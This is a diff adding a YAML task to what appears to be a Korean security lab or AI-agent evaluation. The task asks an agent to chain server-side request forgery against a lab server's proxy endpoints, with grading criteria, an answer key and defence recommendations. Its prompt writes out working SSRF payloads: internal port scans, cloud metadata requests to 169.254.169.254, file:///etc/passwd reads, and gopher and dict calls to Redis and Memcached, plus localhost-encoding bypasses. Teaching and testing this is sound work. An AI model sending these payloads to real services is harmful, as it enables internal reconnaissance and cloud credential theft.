@@ -764,3 +764,68 @@ steps:
 
     '
   script: ''
+- order: 100
+  instruction: '[Multi-task] SSRF 5단계 통합 — 식별 → 내부 포트 스캔 → localhost 접근 → 클라우드 메타데이터 → 프로토콜 우회.'
+  bastion_prompt: |
+    SSRF 5 표면을 한 흐름의 평가로 수행해줘.
+
+    1) [SSRF 포인트 식별] curl -s {{WEB_IP}}:3000/api/proxy?url=http://example.com / curl -s
+       {{WEB_IP}}:3000/api/preview?url=... / curl -s {{WEB_IP}}:3000/api/import?url=... 의 3 endpoint
+       응답 + 발견된 URL 파라미터 의 (callback / image / preview / webhook) 패턴 표. OWASP A10 + CWE-918 매핑.
+
+    2) [내부 포트 스캔] curl -s "{{WEB_IP}}:3000/api/proxy?url=http://127.0.0.1:22" + 80 + 443 + 3306 + 5432 +
+       6379 + 8080 + 9200 의 8 포트 응답 시간 측정. open vs closed 의 응답 시간 차이 + body 의 service banner
+       포함 여부. MITRE T1090.001 매핑.
+
+    3) [localhost 의 internal service 접근] curl -s "{{WEB_IP}}:3000/api/proxy?url=http://localhost:9200/_cluster/health"
+       의 Elasticsearch / redis-cli 의 INFO / Wazuh API 등 의 내부 service 직접 접근 시도. 응답 의 sensitive
+       data 누출 표. OWASP A10 + CWE-918 매핑.
+
+    4) [클라우드 메타데이터] curl -s "{{WEB_IP}}:3000/api/proxy?url=http://169.254.169.254/latest/meta-data/" (AWS) /
+       http://metadata.google.internal/computeMetadata/v1/?recursive=true (GCP) / http://169.254.169.254/metadata/
+       instance?api-version=2021-02-01 (Azure) 의 3 클라우드 메타데이터 endpoint 시도. AWS IMDSv1 vs IMDSv2
+       (X-aws-ec2-metadata-token 필요) 차이 + 권장 IMDSv2 강제. CWE-918 + CWE-200 매핑.
+
+    5) [프로토콜 우회 + IP 변형 5종] file:///etc/passwd / dict://127.0.0.1:11211/STAT / gopher://127.0.0.1:6379/_INFO /
+       http://2130706433 (10진수) / http://[::ffff:7f00:0001] (IPv6 매핑) 의 5 우회 변형 + 각 의 응답.
+       URL parser inconsistency (Python urllib vs PHP parse_url vs Node url.parse) 의 매트릭스. MITRE T1090.003
+       매핑.
+
+    마지막에 5단계 × (SSRF 표면 / 페이로드 / 영향 / 차단 방법 (URL parser, allowlist, DNS resolution, IMDSv2) /
+    클라우드 위험 / 방어 권고) 의 5×6 매트릭스 + H1 disclosure 5 finding + SSRF 방어 stack (1. URL allowlist
+    only 2. DNS resolution post-validation 3. 169.254.169.254 차단 4. IMDSv2 강제 5. egress firewall 6.
+    파라미터 schema 검증) 출력.
+  hint: SSRF 5 표면 chain. 클라우드 메타데이터 위험 + 6 layer 방어 가 산출물.
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] SSRF 5단계 — 식별/내부포트/localhost/클라우드/프로토콜우회. OWASP A10 + CWE-918/200 + MITRE T1090 매핑 + 5×6 매트릭스 + 6 layer 방어.'
+      success_criteria:
+      - 5 단계 모두 실행
+      - 내부 포트 5개 이상 스캔
+      - 3 클라우드 메타데이터 (AWS/GCP/Azure) 모두 시도
+      - 프로토콜 변형 4개 이상 (file/dict/gopher/decimal IP/IPv6)
+      - IMDSv2 권고 포함
+      - 5×6 매트릭스 + 6 layer 방어
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - curl 표준
+      - ssrfmap / Burp Collaborator 대체 가능
+      - markdown 매트릭스 + 6 layer
+      negative_signs:
+      - 3 단계 이하 만 수행
+      - 클라우드 메타데이터 1개만 시도
+      - 프로토콜 변형 2개 이하
+      - IMDSv2 권고 누락
+      - 매트릭스 6 컬럼 미만
+  target_vm: attacker
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. SSRF 5 표면 + 5×6 매트릭스 + 6 layer 방어.
+  answer_detail: |
+    Cloud Security Engineer 페르소나 — SSRF 5 표면 chain. AWS/GCP/Azure 메타데이터 위험 + IMDSv2 강제 권고.
+  script: ''
